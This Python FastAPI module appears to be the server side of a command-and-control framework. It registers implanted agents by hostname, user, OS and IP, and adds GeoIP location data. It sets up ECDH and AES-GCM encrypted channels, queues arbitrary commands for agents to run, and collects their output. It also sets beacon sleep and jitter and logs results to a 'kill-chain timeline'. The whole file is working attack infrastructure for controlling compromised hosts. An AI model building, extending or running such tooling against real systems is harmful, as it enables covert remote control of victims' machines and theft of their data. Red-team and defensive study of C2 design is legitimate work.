import base64
import json
from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from db.database import get_db
from models.agent import Agent
from models.task import Task
from core.ws_manager import manager
from core.ecdh_srv import perform_ecdh
from pydantic import BaseModel
from typing import Optional
from datetime import datetime
import asyncio

router = APIRouter(prefix="/api/agents", tags=["agents"])


class AgentCheckin(BaseModel):
    hostname: str
    username: str
    os: str
    arch: str
    ip: str
    pub_key: Optional[str] = None   # ECDH P-256 public key (hex, 65 bytes uncompressed)


class TaskResult(BaseModel):
    task_id: str
    output: str
    status: str


def _decrypt_body(raw: bytes, session_key_hex: str) -> dict:
    """Decrypt agent request body if session key is established."""
    if not session_key_hex:
        return json.loads(raw)
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    try:
        envelope = json.loads(raw)
        if "enc" not in envelope:
            return envelope
        ct = bytes.fromhex(envelope["enc"])
        key = bytes.fromhex(session_key_hex)
        aesgcm = AESGCM(key)
        nonce, ciphertext = ct[:12], ct[12:]
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext)
    except Exception:
        return json.loads(raw)


def _encrypt_response(data: dict, session_key_hex: str) -> dict:
    """Encrypt server response if session key is established."""
    if not session_key_hex:
        return data
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import os as _os
    key = bytes.fromhex(session_key_hex)
    aesgcm = AESGCM(key)
    nonce = _os.urandom(12)
    plaintext = json.dumps(data).encode()
    ct = aesgcm.encrypt(nonce, plaintext, None)
    return {"enc": (nonce + ct).hex()}


@router.post("/checkin")
async def agent_checkin(request: Request, db: Session = Depends(get_db)):
    raw = await request.body()

    # Determine if body is encrypted (agent sends ?id=<agent_id> when key exchanged)
    agent_id_param = request.query_params.get("id")
    session_key_hex = ""
    if agent_id_param:
        existing = db.query(Agent).filter(Agent.id == agent_id_param).first()
        if existing and existing.session_key:
            session_key_hex = existing.session_key

    try:
        body = _decrypt_body(raw, session_key_hex)
    except Exception:
        raise HTTPException(status_code=400, detail="Bad request body")

    data = AgentCheckin(**body)

    agent = db.query(Agent).filter(
        Agent.hostname == data.hostname,
        Agent.username == data.username
    ).first()

    server_pub = None

    is_new = False
    if not agent:
        is_new = True
        agent = Agent(
            hostname=data.hostname,
            username=data.username,
            os=data.os,
            arch=data.arch,
            ip=data.ip,
        )
        # GeoIP enrichment on first checkin
        try:
            from core.geoip import lookup, flag_emoji
            geo = lookup(data.ip)
            if geo:
                agent.geo_country      = geo.get("country", "")
                agent.geo_country_code = geo.get("country_code", "")
                agent.geo_city         = geo.get("city", "")
                agent.geo_isp          = geo.get("isp", "")
                agent.geo_lat          = geo.get("lat", 0.0)
                agent.geo_lon          = geo.get("lon", 0.0)
                agent.geo_flag         = flag_emoji(geo.get("country_code", ""))
        except Exception:
            pass
        db.add(agent)
        db.flush()  # get agent.id

        if data.pub_key:
            try:
                sk_bytes, server_pub = perform_ecdh(data.pub_key)
                agent.session_key = sk_bytes.hex()
            except Exception:
                pass
    else:
        agent.last_seen = datetime.utcnow()
        agent.is_active = True
        # Re-key if agent sends new pub_key (e.g. after restart)
        if data.pub_key and not agent.session_key:
            try:
                sk_bytes, server_pub = perform_ecdh(data.pub_key)
                agent.session_key = sk_bytes.hex()
            except Exception:
                pass

    db.commit()
    db.refresh(agent)

    # Fire plugin hooks
    try:
        from core import plugin_loader
        agent_dict = {
            "id": agent.id, "hostname": agent.hostname, "username": agent.username,
            "os": agent.os, "arch": agent.arch, "ip": agent.ip,
            "geo_country": agent.geo_country, "geo_flag": agent.geo_flag,
        }
        if is_new:
            plugin_loader.fire_agent_new(agent_dict)
        else:
            plugin_loader.fire_agent_checkin(agent_dict)
    except Exception:
        pass

    pending = db.query(Task).filter(
        Task.agent_id == agent.id,
        Task.status == "pending"
    ).first()

    if pending:
        pending.status = "running"
        db.commit()

    response = {
        "agent_id": agent.id,
        "sleep": agent.sleep,
        "jitter": agent.jitter,
        "task": {"id": pending.id, "command": pending.command} if pending else None,
    }
    if server_pub:
        response["server_pub"] = server_pub

    return _encrypt_response(response, agent.session_key if not server_pub else "")


@router.post("/{agent_id}/result")
async def submit_result(agent_id: str, request: Request, db: Session = Depends(get_db)):
    raw = await request.body()

    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    session_key_hex = agent.session_key if agent else ""

    try:
        body = _decrypt_body(raw, session_key_hex)
        result = TaskResult(**body)
    except Exception:
        raise HTTPException(status_code=400, detail="Bad request body")

    task = db.query(Task).filter(Task.id == result.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.output = result.output
    task.status = result.status
    task.completed_at = datetime.utcnow()
    db.commit()

    # Log operation event for kill-chain timeline
    try:
        from api.intelligence import log_event
        log_event(db, agent_id, task.id, task.command, result.output, result.status)
    except Exception:
        pass

    event = {
        "type": "task_update",
        "task_id": task.id,
        "agent_id": agent_id,
        "output": result.output,
        "status": result.status,
    }
    await manager.broadcast_task_update(agent_id, event)
    await manager.broadcast_task_update("__all__", event)

    return {"status": "ok"}


@router.get("/")
def list_agents(db: Session = Depends(get_db)):
    return db.query(Agent).all()


@router.get("/{agent_id}/tasks")
def get_tasks(agent_id: str, db: Session = Depends(get_db)):
    return db.query(Task).filter(Task.agent_id == agent_id).order_by(Task.created_at.desc()).all()


@router.patch("/{agent_id}/sleep")
def update_sleep(agent_id: str, sleep: int, jitter: int = 1, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.sleep = str(sleep)
    agent.jitter = str(jitter)
    db.commit()
    return {"status": "ok"}


class AgentNotesUpdate(BaseModel):
    notes: str = ""
    tags: str = ""


@router.patch("/{agent_id}/notes")
def update_notes(agent_id: str, data: AgentNotesUpdate, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.notes = data.notes
    agent.tags = data.tags
    db.commit()
    return {"status": "ok"}


@router.delete("/{agent_id}")
def delete_agent(agent_id: str, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    db.query(Task).filter(Task.agent_id == agent_id).delete()
    db.delete(agent)
    db.commit()
    return {"status": "deleted"}


@router.post("/heartbeat-check")
def heartbeat_check(db: Session = Depends(get_db)):
    from datetime import timedelta
    threshold = datetime.utcnow() - timedelta(minutes=5)
    stale = db.query(Agent).filter(Agent.last_seen < threshold, Agent.is_active == True).all()
    count = 0
    for a in stale:
        a.is_active = False
        count += 1
    db.commit()
    return {"marked_inactive": count}
